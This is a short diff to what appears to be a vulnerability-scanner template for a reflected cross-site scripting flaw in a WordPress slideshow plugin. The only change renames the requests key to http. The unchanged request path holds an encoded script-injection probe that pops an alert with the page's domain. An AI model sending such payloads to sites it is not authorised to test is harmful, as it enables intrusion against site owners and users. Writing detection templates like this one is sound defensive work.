@@ -7,7 +7,7 @@ info:
   reference: https://www.exploit-db.com/exploits/37948
   tags: wordpress,xss,wp-plugin
 
-requests:
+http:
   - method: GET
     path:
       - '{{BaseURL}}/wp-content/plugins/slideshow-jquery-image-gallery/views/SlideshowPlugin/slideshow.php?randomId=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E'
